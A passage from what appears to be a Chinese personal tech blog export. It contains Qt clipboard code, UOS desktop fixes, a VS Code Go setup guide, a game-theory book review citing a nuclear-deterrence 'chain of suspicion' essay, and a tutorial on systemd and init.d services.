 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">emit <span class="title">ClipboardChanged</span><span class="params">(strClipboardData,<span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(nType))</span></span>;</span><br></pre></td></tr></table></figure>
<h2 id="剪贴板设置"><a href="#剪贴板设置" class="headerlink" title="剪贴板设置"></a>剪贴板设置</h2></li>
<li><p>使用dbus绑定接口<code>SetDataToCB</code></p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">QMetaObject::<span class="built_in">invokeMethod</span>(<span class="built_in">parent</span>(), <span class="string">&quot;SetDataToCB&quot;</span>, <span class="built_in">Q_ARG</span>(QString, path),<span class="built_in">Q_ARG</span>(<span class="keyword">const</span> <span class="keyword">int</span>,nType));</span><br></pre></td></tr></table></figure></li>
<li><p>设置文件图片和文字</p>
</li>
</ol>
<ul>
<li><p>图片</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">QImage img;</span><br><span class="line">QByteArray arr_base64 = clipboardData.<span class="built_in">toLatin1</span>();</span><br><span class="line">img.<span class="built_in">loadFromData</span>(QByteArray::<span class="built_in">fromBase64</span>(arr_base64));</span><br><span class="line">m_clipBoard-&gt;<span class="built_in">setImage</span>(img);</span><br><span class="line"><span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;set clipboard data as Image&quot;</span>;</span><br></pre></td></tr></table></figure></li>
<li><p>文字</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">m_clipBoard-&gt;<span class="built_in">setText</span>(clipboardData);</span><br><span class="line"><span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;set clipboard data as text:&quot;</span> &lt;&lt; clipboardData;</span><br></pre></td></tr></table></figure></li>
<li><p>文件</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">QString CopiedFile;</span><br><span class="line">QString UrlList;</span><br><span class="line"><span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;set clipboard data as file:&quot;</span> &lt;&lt; clipboardData;</span><br><span class="line">QStringList clipboardList = clipboardData.<span class="built_in">split</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (QString path : clipboardList) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!path.<span class="built_in">isEmpty</span>()) &#123;</span><br><span class="line">        CopiedFile = CopiedFile + <span class="string">&quot;copy\nfile://&quot;</span> + path;</span><br><span class="line">        UrlList = UrlList + <span class="string">&quot;file://&quot;</span> + path + <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (CopiedFile.<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">qDebug</span>() &lt;&lt; <span class="string">&quot;clipboard path is empty&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">QMimeData *newMimeData = <span class="keyword">new</span> <span class="built_in">QMimeData</span>();</span><br><span class="line">newMimeData-&gt;<span class="built_in">setData</span>(<span class="string">&quot;x-special/gnome-copied-files&quot;</span>,</span><br><span class="line">                     <span class="built_in">QByteArray</span>(CopiedFile.<span class="built_in">toStdString</span>().<span class="built_in">c_str</span>()));</span><br><span class="line">newMimeData-&gt;<span class="built_in">setData</span>(<span class="string">&quot;text/uri-list&quot;</span>, <span class="built_in">QByteArray</span>(UrlList.<span class="built_in">toStdString</span>().<span class="built_in">c_str</span>()));</span><br><span class="line">m_clipBoard-&gt;<span class="built_in">clear</span>();</span><br><span class="line">m_clipBoard-&gt;<span class="built_in">setMimeData</span>(newMimeData);</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>Linux技术分享</tag>
      </tags>
  </entry>
  <entry>
    <title>【问题解决】解决UOS部分问题</title>
    <url>/2021/05/19/%E8%A7%A3%E5%86%B3UOS%E9%83%A8%E5%88%86%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="解决UOS部分问题"><a href="#解决UOS部分问题" class="headerlink" title="解决UOS部分问题"></a>解决UOS部分问题</h1><ul>
<li>修改配置文件，实现UOS文管不显示已挂载磁盘。</li>
<li>解决扩展屏时,dock栏来回跳转</li>
</ul>
<span id="more"></span>
<h2 id="1-UOS挂载磁盘不显示"><a href="#1-UOS挂载磁盘不显示" class="headerlink" title="1. UOS挂载磁盘不显示"></a>1. UOS挂载磁盘不显示</h2><p>问题描述：</p>
<p>多个磁盘在文管显示，其实都是零碎的挂载没什么用，现在要想开机把他隐藏。<br><img src="/2021/05/19/%E8%A7%A3%E5%86%B3UOS%E9%83%A8%E5%88%86%E9%97%AE%E9%A2%98/1.png" alt="图1"></p>
<p>解决方案1：</p>
<ul>
<li><p>可以在/lib/udev/rules.d/80-udisks2.rules 里面加入<code>ENV&#123;ID_fS_TYPE&#125;==&quot;squashfs&quot; ENV&#123;UDISKS_IGNORE&#125;=&quot;1&quot;</code></p>
<p><img src="/2021/05/19/%E8%A7%A3%E5%86%B3UOS%E9%83%A8%E5%88%86%E9%97%AE%E9%A2%98/2.png" alt="图2"></p>
</li>
<li><p>/etc/udev/rules.d下面如果有80-udisks2.rules这个文件，刚刚的修改没有意义，大家把这个文件改个名字即可：/etc/udev/rules.d/80-udisks2-install.rules。这是老版本bug</p>
<p><img src="/2021/05/19/%E8%A7%A3%E5%86%B3UOS%E9%83%A8%E5%88%86%E9%97%AE%E9%A2%98/3.png" alt="图3"></p>
</li>
</ul>
<p>解决方案2：</p>
<ul>
<li>我遇见的是fusemount挂载，想在文管隐藏，当我挂载到<code>/tmp</code>目录下任何一个文件夹下文管就不显示了。</li>
</ul>
<p><img src="/2021/05/19/%E8%A7%A3%E5%86%B3UOS%E9%83%A8%E5%88%86%E9%97%AE%E9%A2%98/4.png" alt="图4"></p>
<h2 id="2-扩展屏幕dock来回跳转"><a href="#2-扩展屏幕dock来回跳转" class="headerlink" title="2. 扩展屏幕dock来回跳转"></a>2. 扩展屏幕dock来回跳转</h2><p>解决方案:</p>
<blockquote>
<p>gsettings set com.deepin.dde.dock.mainwindow only-show-primary true</p>
</blockquote>
]]></content>
      <categories>
        <category>问题解决</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
      </tags>
  </entry>
  <entry>
    <title>【问题解决】vscode上go的自动补全和跳转</title>
    <url>/2021/04/27/vscode%E4%B8%ADgo/</url>
    <content><![CDATA[<h1 id="vscode上go自动补全问题和跳转问题"><a href="#vscode上go自动补全问题和跳转问题" class="headerlink" title="vscode上go自动补全问题和跳转问题"></a>vscode上go自动补全问题和跳转问题</h1><p><em><strong>在UOS环境下用vscode，不能跳转和自动补全。</strong></em></p>
<span id="more"></span>
<h2 id="ctrl不能跳转"><a href="#ctrl不能跳转" class="headerlink" title="ctrl不能跳转"></a>ctrl不能跳转</h2><p>解决：</p>
<ul>
<li>settings-&gt;搜索 use language server-&gt;Go: Use Language Server 改为非选中状态,就可以跳转了,这里是重点,重点.必须的要更改。</li>
<li>设置搜索Docs Tool，把 Docs Tool改成gogetdoc或者guru试试，我的用guru就可以。</li>
</ul>
<h2 id="自动补全失效"><a href="#自动补全失效" class="headerlink" title="自动补全失效"></a>自动补全失效</h2><p>解决：<br>在升级到 1.11后， go加入了go module这一特性， 支持相对路径的导入包，这样在$GOPATH之外的地方也可以进行项目开发。</p>
<ol>
<li>但是vscode中很多插件只能工作在 $GOPATH下， 其中最重要的代码智能提示也是如此代码提示主要由 github.com/mdemsky/gocode 这个模块负责， 为了支持go module， 要使用新的gocode模块，项目地址为 github.com/stamblerre/gocode， 为了更新插件</li>
</ol>
<p>将$GOPATH/bin 中的 gocode 可执行文件删掉</p>
<ol start="2">
<li><p>go get -u -v github.com/stamblerre/gocode 获取包， 这里是不能安装的，有冲突</p>
</li>
<li><p>去到 $GOPATH/src/golang.org/x 这个目录下， 删除tools这个包，它和新版的 gocode不兼容，不要试图 git pull获取最新版，这个是被墙了的</p>
</li>
<li><p>从 <a href="https://github.com/golang/tools">https://github.com/golang/tools</a> 下载最新的tools包，clone很慢就直接下载 zip 文件， 解压到刚才原来的位置。</p>
</li>
<li><p>编译安装 stamblerre/gocode， go build -o $GOPATH/bin/gocode-gomod github.com/stamblerre/gocode或者直接到$GOPATH/src/github.com/stamblerre/gocode目录下执行go build</p>
</li>
</ol>
<p>到此， Vscode智能提示就可以正常工作了</p>
]]></content>
      <categories>
        <category>问题解决</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
      </tags>
  </entry>
  <entry>
    <title>【读书有感】谈谈《博弈论诡计》</title>
    <url>/2021/04/27/%E5%8D%9A%E5%BC%88%E8%AE%BA/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><em><strong>在一个咖啡屋偶然接触到这本书，当时旁边我翻遍了隔壁书架，一群要么是《骆驼祥子》，《呐喊》，《酒馆》这种上世纪的书，或是再给我整点余秋雨的风风雨雨，或者是再搞点三毛的恩恩爱爱，想找两本王朔的或者余华硬一点的却翻不到，碰巧遇到了，博弈论。现在想起，可能是《博弈论》前两的囚徒困境吸引住了我吧。现在距看完这本书两个月了，许多片段还能历历在目。</strong></em></p>
<span id="more"></span>

<h2 id="对人的博弈"><a href="#对人的博弈" class="headerlink" title="对人的博弈"></a>对人的博弈</h2><p>我觉得如果是正经人对完这本书，应该对一点人情世故有所提升。我只能讲一下，我自己看完的对其浅薄的理解。每个人和其他人交往是时候都是在博弈，可能你自己没有注意到，但是和他人的博弈都是在井然有序的发生，默认的处理的方法就是经验论，参照别人处理的方式。这种方法总不能说是错的，但回头想想这可能不是最优解，每个人性格，遇到的矛盾总是不同而已的，一招鲜吃遍天，不太适用。</p>
<p><img src="/2021/04/27/%E5%8D%9A%E5%BC%88%E8%AE%BA/1.jpeg" alt="图1"></p>
<p><code>举个栗子</code>：当你公司同事想去聚餐，想把你拉过去，但是你刚进公司，对公司同事不熟悉，这时候你就要考虑拒绝他还是答应他呢，我们画个表格。</p>
<p><img src="/2021/04/27/%E5%8D%9A%E5%BC%88%E8%AE%BA/15.png" alt="图15"></p>
<p>表格上很清楚明了，如果你觉得自身的舒适度比同事好感度重要的话，合理的拒绝总是利大于弊的，如果是刚来公司，想在新公司发展的话，还是多多的参加聚餐与同事熟络。可能你觉得这个栗子比较简单，生活中的经验论完全就可以解决这个问题，但是事实上许多复杂的东西，就是需要这种逻辑，特别的当你的对手是一个相当成熟的职场上<code>高手</code>的时候，他的每一步都在深思熟虑，都在找一个最优解。历史上往往很离谱的事情，把我们代入过去一步一步分析，那个离谱结果可能就是就是最优解。</p>
<h2 id="对社会博弈理解"><a href="#对社会博弈理解" class="headerlink" title="对社会博弈理解"></a>对社会博弈理解</h2><p>社会上博弈从博弈论创始到现在，开始是冯·诺依曼证明了博弈论的基本原理，纳什有过完善，再～～～～～～～～发展，我就不记人名了，原谅我的差记性。大概是从提出的了博弈论，然后提出了博弈论的囚徒困境的局限性，再而破解了囚徒困境，提出了合作博弈理论，大概是这个历程。</p>
<p><img src="/2021/04/27/%E5%8D%9A%E5%BC%88%E8%AE%BA/2.jpeg" alt="图2"></p>
<p><code>举个栗子</code>：知乎上有个问题说的很好，核武器的六层猜疑链核威慑里的六层猜疑链<br>什么叫核威慑？很多人理解的核威慑，就是你敢发射核弹搞死我，我就敢发射核弹搞死你。在那个曾经只有美苏拥有核武器的年代，核威慑确实是这样的。但如今不是了。冷战末期时，美国拥有核弹头31255枚，苏联那边也差不多，每年的维护保养费用都是一个天文数字。那个年代，美苏两国确实是奔着直接搞死对面的心态去的，而且要有能搞死对面很多遍的能力才放心。1991年，美苏两国达成协议，削减各自的核武器，直接把人类接近80%的核武器化为乌有。但即便如此，美苏两国依然各自拥有近7000枚核武器，依然可以把对方搞死很多遍。目前全人类总共有15000多枚核弹头，基本都在美国和俄罗斯那里。而中国的核武器一直数量很少，只有美苏两国的零头，大概几百枚的样子。如此之少的核武器，怎么和美俄抗衡？</p>
<p><img src="/2021/04/27/%E5%8D%9A%E5%BC%88%E8%AE%BA/3.jpeg" alt="图3"></p>
<p>以前的中国穷，造不起，甚至维护不起核武器，这可以理解。但今天的中国不穷了啊，为什么不造几万枚核武器撑场面？因为完全没有必几百枚核武器，已经够用了。够用的原因，不是因为几百枚核武器真的够用，而是因为美国和俄罗斯的核武器够用。美国和俄罗斯的核武器，就是中国的核武器。核武器+洲际导弹的组合，让核威慑产生了极其复杂的变化。如果美国决定拿出3000枚核武器，先发制人，在中国没有反应过来之前就对中国进行地毯式核轰炸，把中国从地球上彻底的抹去。</p>
<p><img src="/2021/04/27/%E5%8D%9A%E5%BC%88%E8%AE%BA/4.jpeg" alt="图4"></p>
<p>那美国担心的是中国的核反制么？确实会担心，因为美国的反导系统不可能拦截中国发射的所有核武器，肯定有不少核弹头直接落在美国的大城市里。但这并不是美国最害怕的事情。美国最害怕的，是引发全球所有核国家的猜疑。首先，发动核攻击之前是要绝对保密的，绝对不可能对世界宣布的，更不可能挨个和盟友甚至敌国进行解释。这道理很好理解。假设你和对手都有枪，互相指着对手的头，谁都不敢开枪，这个时候如果对手告诉你，他准备开枪了，请问你会怎么做？</p>
<p><img src="/2021/04/27/%E5%8D%9A%E5%BC%88%E8%AE%BA/5.jpeg" alt="图5"></p>
<p>如果核攻击真的发动，那一定是毫无征兆的。<br>假如美国3000枚核弹头铺天盖地的向亚洲飞过来，在洲际导弹飞行的这十几分钟里，各核国家会想很多很多事情。</p>
<ul>
<li>第一层猜疑链：比如说俄罗斯，他首先会想一件事，这么多导弹到底是来炸谁的，是炸中国？还是炸俄罗斯？根据雷达测定，目前的飞行轨迹全部指向中国，看起来好像是炸中国的。但洲际导弹都是可以变轨的，这些弹头会不会在落地前分出一半，突然变轨来炸俄罗斯？等它变轨后，俄罗斯只有三分钟时间了，压根都没时间反应。如果等俄罗斯被炸了再反制，是不是太晚了？要不要提前发射核武器，先把美国给炸了，以防万一。这个问题，不仅俄罗斯会想，英国和法国也会想。</li>
</ul>
<p><img src="/2021/04/27/%E5%8D%9A%E5%BC%88%E8%AE%BA/6.jpeg" alt="图6"></p>
<ul>
<li>第二层猜疑链：除了害怕洲际导弹突然变轨之外，俄罗斯还会想一个问题。美国哪来的胆子突然炸中国的，他炸中国的目的是什么，他为什么敢炸中国。如果美国冒着本国被核弹攻击的风险，对中国发动核袭击，那为什么不顺便把俄罗斯一起给炸了，反正承担的风险是差不多的。所以，俄罗斯人会预估美国肯定会对俄罗斯发动核攻击。不管第一波核导弹是炸中国还是炸俄罗斯的，最后都一定会炸俄罗斯。既然如此，那俄罗斯索性就先动手吧。同样，这个问题，不仅俄罗斯会想，英国和法国也会想。</li>
</ul>
<p><img src="/2021/04/27/%E5%8D%9A%E5%BC%88%E8%AE%BA/7.jpeg" alt="图7"></p>
<ul>
<li>第三层猜疑链：更可怕的是，美国担心的绝不仅仅是俄罗斯的不信任。假设俄罗斯的领导人，有超强的定力，对美国有超强的信任，对人类有超强的慈悲之心，相信美国是只炸中国的，冒着俄罗斯人全部被屠灭的风险，最后没有下令发射核弹。俄罗斯还要担心一个问题，中国在对美国发动核反制的同时，会不会顺便给俄罗斯、英国、法国丢一波核弹。反正那个时候中国已经没了，名声这东西要来干嘛呢，大家一起死好了。这不是说中国一定会这么做，只要可能这么做就很可怕了。</li>
</ul>
<p><img src="/2021/04/27/%E5%8D%9A%E5%BC%88%E8%AE%BA/8.jpeg" alt="图8"></p>
<ul>
<li>第四层猜疑链：如果中国遭受美国核攻击后，可能会攻击全球核大国，那么英国法国应该如何自保？假如俄罗斯被炸了，哪怕只有几个主要大城市被炸了，国力都会严重削弱，从而彻底衰退，甚至可能会灭国。那么，俄罗斯会不会直接炸平全球，来确保俄罗斯的安全，或者拉全球给俄罗斯陪葬？如果英国和法国假定俄罗斯会这么做，那么为了英国和法国的国家利益最大化。从最理智的角度，英国和法国，应该立即发射所有的核弹，拉全球陪葬。偏偏一国领导人，一般来说都是相当理智的。</li>
</ul>
<p><img src="/2021/04/27/%E5%8D%9A%E5%BC%88%E8%AE%BA/12.jpeg" alt="图9"></p>
<ul>
<li>第五层猜疑链：当美国对中国发射核弹后，如果美国假定中国会核反制其他核大国，然后假定其他核大国为了自身利益最大化，都会直接把核弹头丢在美国头上，那美国会怎么应对这一情况？因为这个概率不仅有，而且还很高。作为美国，如果想要让本国利益最大化，在核攻击中国的同时，就应该同时核攻击俄罗斯、英国和法国等任何有能力对美国发动核攻击的国家。这才是美国最理性的选择。</li>
</ul>
<p><img src="/2021/04/27/%E5%8D%9A%E5%BC%88%E8%AE%BA/13.jpeg" alt="图10"></p>
<ul>
<li>第六层猜疑链：因为俄罗斯、英国和法国，都知道美国肯定会受困在第五层猜疑链，对本国发动核攻击的概率非常之大，自己无论怎么做都无法安抚美国。毕竟此时的美国已经疯了，如果不疯是无论如何都不敢发动核战争的。英法俄估计美国肯定会估计英法俄会估计美国会炸掉英法俄。所以英法俄无论如何都无法获得安全感。既然美国肯定会受困在猜疑链，肯定会对所有核国家发动打击，那么自己肯定就是个死。那，自己索性就拉全世界一起陪葬吧，说不定最后的情况还好一点。因此，在看到美国核弹头铺天盖地射向中国的一瞬间，俄罗斯、英国和法国，就会同时启动自己国家的核武库，向全世界所有国家发射核弹。你是真心实意的想炸中国？巧了，我怕你炸的不干净，或者导弹中途变向来炸我，我也帮你炸一遍中国吧，另外把你美国也全给炸了。</li>
</ul>
<p><img src="/2021/04/27/%E5%8D%9A%E5%BC%88%E8%AE%BA/11.jpeg" alt="图11"></p>
<p>这六层猜疑链，基本没有国家能熬过去。而且即便有个把国家的领导人熬过去了，也没用，需要所有核国家的领导人全部熬过去，拿命去相信彼此，才算破除猜疑链。上面的全是转自知乎，我觉得是个经典的博弈所以引用一下。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>当我们不知道对方底牌时，保持沉默是一个不错的办法。</li>
<li>从长远来看，赌博是一个注定会输的游戏。</li>
<li>如果一开始就让人觉得你多么了不起，对你给予了种种厚望，可你随后的表现让人一次又一次的失望，结果你只会被人越来越看不起。这种反差效应值得人们借鉴。别人对你的期望值越高，越容易看出你的平庸，发现你的错误;相反，如果别人本来对你并不抱有厚望，你的成绩就回容易被人发现，甚至让人吃惊。</li>
<li>一个人的信息量是很有限的，要通过群体拓展思路，打开局面，才能在残酷的市场竞争中站稳脚跟。</li>
<li>“当你自估的成功概率达到%40~%70，你就该去这件事了。也许你会失败，但拖延或等待的代价往往更大。”</li>
<li>在幸福博弈时，不要拿自己的不幸和别人幸福的一面去比。决定你快乐或不快乐的，不是别人，是你自己。</li>
</ul>
<p><img src="/2021/04/27/%E5%8D%9A%E5%BC%88%E8%AE%BA/16.png" alt="图16"></p>
]]></content>
      <categories>
        <category>阅读</category>
      </categories>
      <tags>
        <tag>读书有感</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】systemctl和service启动服务</title>
    <url>/2021/04/25/systemctl%E5%92%8Cservice/</url>
    <content><![CDATA[<h1 id="Linux开启自启服务器"><a href="#Linux开启自启服务器" class="headerlink" title="Linux开启自启服务器"></a>Linux开启自启服务器</h1><p><em><strong>网上很多介绍systemctl和service的区别和使用，我觉得都没有说到点子上，本文介绍这两个自启动命令，并且加自己经常使用具体方法。</strong></em></p>
<span id="more"></span>
<h2 id="systemctl"><a href="#systemctl" class="headerlink" title="systemctl"></a>systemctl</h2><ol>
<li><p>背景说明</p>
<blockquote>
<p>systemd，当系统启动之后systemd就会成功系统的第一个进程，而我们这个systemctl命令就是systemd命令中最重要的命令之一，用于管理系统。</p>
</blockquote>
<blockquote>
<p>systemctl命令在centos6及以下版本是不支持的，调用这个命令会报<code>命令未找到</code> or <code>command not found</code>错误,但是在7以上Linux为了提高系统的启动速度，尽可能的增加多个进程同时启动，所以就支持了systemd，也就是systemctl命令。</p>
</blockquote>
</li>
<li><p>调用方法</p>
<table>
<thead>
<tr>
<th align="left">systemctl 命令</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">systemctl stop</td>
<td align="left">停止</td>
</tr>
<tr>
<td align="left">systemctl start</td>
<td align="left">开始</td>
</tr>
<tr>
<td align="left">systemctl status</td>
<td align="left">查看状态</td>
</tr>
<tr>
<td align="left">systemctl mark</td>
<td align="left">注销</td>
</tr>
<tr>
<td align="left">systemctl suspend</td>
<td align="left">进入睡眠</td>
</tr>
<tr>
<td align="left">systemctl hibermate</td>
<td align="left">进入休眠</td>
</tr>
<tr>
<td align="left">systemctl get-default</td>
<td align="left">获得当前运行级别</td>
</tr>
</tbody></table>
</li>
<li><p>具体调用逻辑</p>
<blockquote>
<p>关键词daemon：后台服务进程，常驻。</p>
</blockquote>
<p> 文件保存路径主要是在以下三个路径，我自己写的service文件通常会用脚本，拷贝到下面三个路径中。</p>
<ul>
<li>/usr/lib/systemd/system</li>
<li>/run/systemd/system</li>
<li>/etc/systemd/system</li>
</ul>
<p> unit文件分很多种，我主要讲一下service文件和Target文件，这两个文件在写linux应用的时候用的比较多一点。</p>
<ol>
<li><p>service:文件扩展名为.service，用于定义系统服务，文件内容类似于desktop文件。</p>
<p> [unit]段常用的选项</p>
<ul>
<li>Description：描述信息，意义性描述</li>
<li>After：定义unit的启动顺序，晚于某服务启动</li>
<li>Requies：依赖其他的units，当依赖的服务没启动，是不能启动此服务的，强依赖</li>
<li>Waints：和上面一样，弱依赖</li>
<li>Conficts：定义units冲突关系（不太明白）</li>
</ul>
<p> [Service]段常用选项</p>
<ul>
<li><p>Type：用于定义影响ExecStart和相关参数功能unit进程启动类型</p>
<ol>
<li>simple:默认值，这个daemon主要由execstart后面所写的字符串来启动，启动后常驻内存。</li>
<li>forking:由 ExecStart 启动的程序通过 spawns 延伸出其他子程序来作为此 daemon 的主要服务。原生的父程序在启动结束后就会终止运行，ps：类似于管道启动</li>
<li>oneshot:与simple类似的启动方式类似，但是工作完就结束，不常驻内存</li>
<li>dbus:与simple类似的启动方式类似，但要设置DbusName=XX，daemon程序才会运行。</li>
<li>notify:暂时不了解</li>
<li>idle:与simple类似，要执行这个daemon 必须要所有的工作都顺利执行完毕后才会执行。这类的daemon 通常是开机到最后才执行即可的服务</li>
</ol>
</li>
<li><p>EnvironmentFile：环境配置文件</p>
</li>
<li><p>ExecStart：启动脚本或者命令进程</p>
</li>
<li><p>ExecStop：停止脚本或者命令进程</p>
</li>
</ul>
<p> [install]段常用选项</p>
<ul>
<li>Alias：暂时不了解</li>
<li>RequiredBy：被哪些units所依赖，强</li>
<li>WantedBy：如上，弱</li>
</ul>
</li>
</ol>
</li>
</ol>
<pre><code>2. Target：文件扩展为.target，用于模拟实现“运行级别”。


举个实际性的例子，如果我完成了一个程序的编写或者脚本的编写，想让他开机启动并且常驻的话，我就可以自己写一个servcie文件，放入上文中三条路径中，类似下面这个文件。

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description&#x3D;test</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type&#x3D;forking</span><br><span class="line">ExecStart&#x3D;&#x2F;home&#x2F;mecry&#x2F;DemonShell</span><br><span class="line">ExecStop&#x3D;&#x2F;bin&#x2F;kill -HUP $MAINPID</span><br><span class="line">PrivateTmp&#x3D;true</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure>

ExecStart就是我在电脑中目标脚本，脚本中可以写一些监视开机启动的命令，输出到指定文件夹下，比如我监听笔记本闭合事件，开关机时间等，具体日志输出就在/home中的listen.txt文件下。
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 | evtest &gt;&gt;/home/listen.txt</span><br></pre></td></tr></table></figure>
</code></pre>
<p><strong>注意：脚本启动都是已root权限启动，方便调试。非root权限无法启动service服务</strong></p>
<h2 id="service"><a href="#service" class="headerlink" title="service"></a>service</h2><ol>
<li><p>背景说明</p>
<blockquote>
<p>service本质为进程，是linux最早控制服务的一种手段，并不是所有linux都有这个命令，主要是在redhat，fedora，mandriva，centos中 ，这个命令的可执行程序在/sbin下（一般进程都是在/usr/bin下）</p>
</blockquote>
</li>
<li><p>调用方法</p>
<blockquote>
<p>其实没什么调用方法，主要是看你service下的逻辑支持是什么实现，就可以怎么实现。<br> 比如<code>service dbus start</code>，其实调用dbus这个服务文件中start的函数实现。</p>
</blockquote>
</li>
<li><p>具体实现</p>
<p> 看个栗子，比如我本机的dbus服务,文件存放都存放在<code>/etc/init.d/</code>目录下。</p>
 <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment">### BEGIN INIT INFO</span></span><br><span class="line"><span class="comment"># Provides:          dbus</span></span><br><span class="line"><span class="comment"># Required-Start:    $remote_fs $syslog</span></span><br><span class="line"><span class="comment"># Required-Stop:     $remote_fs $syslog</span></span><br><span class="line"><span class="comment"># Default-Start:     2 3 4 5</span></span><br><span class="line"><span class="comment"># Default-Stop:</span></span><br><span class="line"><span class="comment"># Short-Description: D-Bus systemwide message bus</span></span><br><span class="line"><span class="comment"># Description:       D-Bus is a simple interprocess messaging system, used</span></span><br><span class="line"><span class="comment">#                    for sending messages between applications.</span></span><br><span class="line"><span class="comment">### END INIT INFO</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Debian init.d script for D-BUS</span></span><br><span class="line"><span class="comment"># Copyright © 2003 Colin Walters &lt;walters@debian.org&gt;</span></span><br><span class="line"><span class="comment"># Copyright © 2005 Sjoerd Simons &lt;sjoerd@debian.org&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"></span><br><span class="line">DAEMON=/usr/bin/dbus-daemon</span><br><span class="line">UUIDGEN=/usr/bin/dbus-uuidgen</span><br><span class="line">UUIDGEN_OPTS=--ensure</span><br><span class="line">NAME=dbus</span><br><span class="line">DAEMONUSER=messagebus</span><br><span class="line">PIDDIR=/var/run/dbus</span><br><span class="line">PIDFILE=<span class="variable">$PIDDIR</span>/pid</span><br><span class="line">DESC=<span class="string">&quot;system message bus&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span> -x <span class="variable">$DAEMON</span> || <span class="built_in">exit</span> 0</span><br><span class="line"></span><br><span class="line">. /lib/lsb/init-functions</span><br><span class="line"></span><br><span class="line"><span class="comment"># Source defaults file; edit that file to configure this script.</span></span><br><span class="line">PARAMS=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">if</span> [ -e /etc/default/dbus ]; <span class="keyword">then</span></span><br><span class="line">. /etc/default/dbus</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">create_machineid</span></span>() &#123;</span><br><span class="line"><span class="comment"># Create machine-id file</span></span><br><span class="line"><span class="keyword">if</span> [ -x <span class="variable">$UUIDGEN</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="variable">$UUIDGEN</span> <span class="variable">$UUIDGEN_OPTS</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">start_it_up()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> [ ! -d <span class="variable">$PIDDIR</span> ]; <span class="keyword">then</span></span><br><span class="line">    mkdir -p <span class="variable">$PIDDIR</span></span><br><span class="line">    chown <span class="variable">$DAEMONUSER</span> <span class="variable">$PIDDIR</span></span><br><span class="line">    chgrp <span class="variable">$DAEMONUSER</span> <span class="variable">$PIDDIR</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ! mountpoint -q /proc/ ; <span class="keyword">then</span></span><br><span class="line">    log_failure_msg <span class="string">&quot;Can&#x27;t start <span class="variable">$DESC</span> - /proc is not mounted&quot;</span></span><br><span class="line">    <span class="built_in">return</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -e <span class="variable">$PIDFILE</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">if</span> <span class="variable">$0</span> status &gt; /dev/null ; <span class="keyword">then</span></span><br><span class="line">    log_success_msg <span class="string">&quot;<span class="variable">$DESC</span> already started; not starting.&quot;</span></span><br><span class="line">    <span class="built_in">return</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    log_success_msg <span class="string">&quot;Removing stale PID file <span class="variable">$PIDFILE</span>.&quot;</span></span><br><span class="line">    rm -f <span class="variable">$PIDFILE</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">create_machineid</span><br><span class="line"></span><br><span class="line">log_daemon_msg <span class="string">&quot;Starting <span class="variable">$DESC</span>&quot;</span> <span class="string">&quot;<span class="variable">$NAME</span>&quot;</span></span><br><span class="line">start-stop-daemon --start --quiet --pidfile <span class="variable">$PIDFILE</span> \</span><br><span class="line">    --<span class="built_in">exec</span> <span class="variable">$DAEMON</span> -- --system <span class="variable">$PARAMS</span></span><br><span class="line">log_end_msg $?</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shut_it_down()</span><br><span class="line">&#123;</span><br><span class="line">log_daemon_msg <span class="string">&quot;Stopping <span class="variable">$DESC</span>&quot;</span> <span class="string">&quot;<span class="variable">$NAME</span>&quot;</span></span><br><span class="line">start-stop-daemon --stop --retry 5 --quiet --oknodo --pidfile <span 